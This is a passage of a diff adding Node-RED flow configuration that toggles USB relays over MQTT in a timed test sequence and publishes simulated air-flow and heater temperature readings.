+        "func": "// Assume msg.payload contains the relay states object\nvar relayStates = msg.payload; // e.g. {\"QAAMZ_1\":0,\"QAAMZ_2\":0,\"QAAMZ_3\":0,\"QAAMZ_4\":0}\n\nvar messages = [];\nfor (var key in relayStates) {\n    // Create a new message for each relay state\n    var newMsg = {\n        topic: \"usbrelay/state/\" + key,\n        payload: relayStates[key].toString()  // convert value to string\n    };\n    messages.push(newMsg);\n}\n\n// Return the array of messages so that each will be published separately\nreturn [messages];\n",
+        "outputs": 1,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 320,
+        "y": 1000,
+        "wires": [
+            [
+                "a041d130545911ef",
+                "688899619db3a31c"
+            ]
+        ]
+    },
+    {
+        "id": "a041d130545911ef",
+        "type": "debug",
+        "z": "f12",
+        "name": "debug 9",
+        "active": true,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "false",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 520,
+        "y": 1000,
+        "wires": []
+    },
+    {
+        "id": "688899619db3a31c",
+        "type": "mqtt out",
+        "z": "f12",
+        "name": "",
+        "topic": "",
+        "qos": "",
+        "retain": "",
+        "respTopic": "",
+        "contentType": "",
+        "userProps": "",
+        "correl": "",
+        "expiry": "",
+        "broker": "c2d6bca38d1bbe4a",
+        "x": 470,
+        "y": 1060,
+        "wires": []
+    },
+    {
+        "id": "f43ef1180b1cb5c9",
+        "type": "function",
+        "z": "f12",
+        "name": "function 6",
+        "func": "// {\"QAAMZ_1\":0,\"QAAMZ_2\":1,\"QAAMZ_3\":0,\"QAAMZ_4\":0}\nvar payloadObj = msg.payload;\nvar activeKey = null;\n\n// Find the first key with value 1\nfor (var key in payloadObj) {\n    if (payloadObj[key] === 1) {\n        activeKey = key;\n        break;\n    }\n}\n\nvar newValue = 0;\nif (activeKey) {\n    // Map the active key to a random value based on specified ranges\n    if (activeKey === \"QAAMZ_2\") {\n        // Random value between 14.2 and 14.7\n        newValue = Math.random() * (14.7 - 14.2) + 14.2;\n    } else if (activeKey === \"QAAMZ_3\") {\n        // Random value between 2.9 and 3.5\n        newValue = Math.random() * (3.5 - 2.9) + 2.9;\n    } else if (activeKey === \"QAAMZ_1\") {\n        // Random value between 4.5 and 5.2\n        newValue = Math.random() * (5.2 - 4.5) + 4.5;\n    }\n    // Round the new value to 2 decimal places\n    newValue = Number(newValue.toFixed(2));\n}\n\n// If no active key, newValue remains 0\nmsg.payload = { instantaneous_flow: newValue };\nmsg.topic = \"air/flow\"\nreturn msg;\n",
+        "outputs": 1,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 700,
+        "y": 460,
+        "wires": [
+            [
+                "c2e019f372bbb096",
+                "f9b6e11f3e77b4bf"
+            ]
+        ]
+    },
+    {
+        "id": "f9b6e11f3e77b4bf",
+        "type": "mqtt out",
+        "z": "f12",
+        "name": "",
+        "topic": "",
+        "qos": "",
+        "retain": "",
+        "respTopic": "",
+        "contentType": "",
+        "userProps": "",
+        "correl": "",
+        "expiry": "",
+        "broker": "c2d6bca38d1bbe4a",
+        "x": 850,
+        "y": 520,
+        "wires": []
+    },
+    {
+        "id": "07434b2b3a31ea2b",
+        "type": "function",
+        "z": "f12",
+        "name": "function 7",
+        "func": "// Define the MQTT topics and their timing sequences\nvar sequence = [\n    { topic: \"usbrelay/control/QAAMZ_2\", delay: 6000 }, // 6 sec\n    { topic: \"usbrelay/control/QAAMZ_2\", delay: 1000 }, // 1 sec\n    { topic: \"usbrelay/control/QAAMZ_3\", delay: 6000 }, // 6 sec\n    { topic: \"usbrelay/control/QAAMZ_3\", delay: 1000 }, // 1 sec\n    { topic: \"usbrelay/control/QAAMZ_1\", delay: 6000 }, // 6 sec\n    { topic: \"usbrelay/control/QAAMZ_1\", delay: 1000 }  // 1 sec\n];\n\n// Array to store all messages to be sent\nvar messages = [];\n\n// Function to publish messages with delay\nfunction publishMessages(index) {\n    if (index >= sequence.length) {\n        // When sequence is complete, send the ending message\n        node.send({ topic: \"autotest/flow1/stage\", payload: \"測試結束: 全部關閉\" });\n        return;\n    }\n\n    // Create and send the next MQTT message\n    var msg = {\n        topic: sequence[index].topic,\n        payload: \"toggle\"\n    };\n    node.send(msg);\n\n    // Schedule the next message with the defined delay\n    setTimeout(() => publishMessages(index + 1), sequence[index].delay);\n}\n\n// Send the start message\nnode.send({ topic: \"autotest/flow1/stage\", payload: \"測試開始: 全部關閉\" });\n\n// Start the sequence after the start message is sent\nsetTimeout(() => publishMessages(0), 1000); // Small delay before starting the sequence\n\n// Do not return a message immediately since messages are sent asynchronously\nreturn null;\n",
+        "outputs": 1,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 500,
+        "y": 720,
+        "wires": [
+            [
+                "488feb5e6d0602c4",
+                "7945ed8854086447"
+            ]
+        ]
+    },
+    {
+        "id": "61759b33c7ec191f",
+        "type": "delay",
+        "z": "f12",
+        "name": "",
+        "pauseType": "delay",
+        "timeout": "5",
+        "timeoutUnits": "seconds",
+        "rate": "1",
+        "nbRateUnits": "1",
+        "rateUnits": "second",
+        "randomFirst": "1",
+        "randomLast": "5",
+        "randomUnits": "seconds",
+        "drop": false,
+        "allowrate": false,
+        "outputs": 1,
+        "x": 700,
+        "y": 860,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "0937a06f5b969eac",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 280,
+        "y": 720,
+        "wires": [
+            [
+                "07434b2b3a31ea2b"
+            ]
+        ]
+    },
+    {
+        "id": "488feb5e6d0602c4",
+        "type": "debug",
+        "z": "f12",
+        "name": "debug 10",
+        "active": true,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "false",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 720,
+        "y": 720,
+        "wires": []
+    },
+    {
+        "id": "7945ed8854086447",
+        "type": "mqtt out",
+        "z": "f12",
+        "name": "",
+        "topic": "",
+        "qos": "",
+        "retain": "",
+        "respTopic": "",
+        "contentType": "",
+        "userProps": "",
+        "correl": "",
+        "expiry": "",
+        "broker": "c2d6bca38d1bbe4a",
+        "x": 710,
+        "y": 780,
+        "wires": []
+    },
+    {
+        "id": "b25d81a1bfcb11a8",
+        "type": "mqtt in",
+        "z": "f12",
+        "name": "",
+        "topic": "autotest/flow1",
+        "qos": "2",
+        "datatype": "auto-detect",
+        "broker": "c2d6bca38d1bbe4a",
+        "nl": false,
+        "rap": true,
+        "rh": 0,
+        "inputs": 0,
+        "x": 230,
+        "y": 660,
+        "wires": [
+            [
+                "0311d9a8ad048db8"
+            ]
+        ]
+    },
+    {
+        "id": "0311d9a8ad048db8",
+        "type": "switch",
+        "z": "f12",
+        "name": "",
+        "property": "payload",
+        "propertyType": "msg",
+        "rules": [
+            {
+                "t": "eq",
+                "v": "start",
+                "vt": "str"
+            }
+        ],
+        "checkall": "true",
+        "repair": false,
+        "outputs": 1,
+        "x": 410,
+        "y": 660,
+        "wires": [
+            [
+                "07434b2b3a31ea2b"
+            ]
+        ]
+    },
+    {
+        "id": "691c239dd015426e",
+        "type": "function",
+        "z": "b67f0a00fe799f39",
+        "name": "function 8",
+        "func": "// Generate a base temperature between 20°C and 100°C\nlet baseTemp = Math.random() * (100 - 20) + 20;\n\n// Generate four temperatures with a small random variation (±0.5°C)\nlet temp1 = baseTemp + (Math.random() * 1 - 0.5);\nlet temp2 = baseTemp + (Math.random() * 1 - 0.5);\nlet temp3 = baseTemp + (Math.random() * 1 - 0.5);\nlet temp4 = baseTemp + (Math.random() * 1 - 0.5);\n\n// Format temperatures to 1 decimal place\nlet payload = {\n    temp1: parseFloat(temp1.toFixed(1)),\n    temp2: parseFloat(temp2.toFixed(1)),\n    temp3: parseFloat(temp3.toFixed(1)),\n    temp4: parseFloat(temp4.toFixed(1))\n};\n\n// Set the payload\nmsg.payload = payload;\n\n// Return the message to output\nreturn msg;\n",
+        "outputs": 1,
+        "timeout": "",
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 400,
+        "y": 160,
+        "wires": [
+            [
+                "7aeef850d4558550",
+                "63fdd1f6e3f31134"
+            ]
+        ]
+    },
+    {
+        "id": "6feae5491d77e319",
+        "type": "inject",
+        "z": "b67f0a00fe799f39",
+        "name": "溫度更新",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "1",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 210,
+        "y": 160,
+        "wires": [
+            [
+                "691c239dd015426e"
+            ]
+        ]
+    },
+    {
+        "id": "7aeef850d4558550",
+        "type": "debug",
+        "z": "b67f0a00fe799f39",
+        "name": "debug 11",
+        "active": false,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "false",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 600,
+        "y": 160,
+        "wires": []
+    },
+    {
+        "id": "63fdd1f6e3f31134",
+        "type": "mqtt out",
+        "z": "b67f0a00fe799f39",
+        "name": "",
+        "topic": "heater/temperature",
+        "qos": "",
+        "retain": "",
+        "respTopic": "",
+        "contentType": "",
+        "userProps": "",
+        "correl": "",
+        "expiry": "",
+        "broker": "c2d6bca38d1bbe4a",
+        "x": 650,
+        "y": 240,
+        "wires": []
+    }
+]
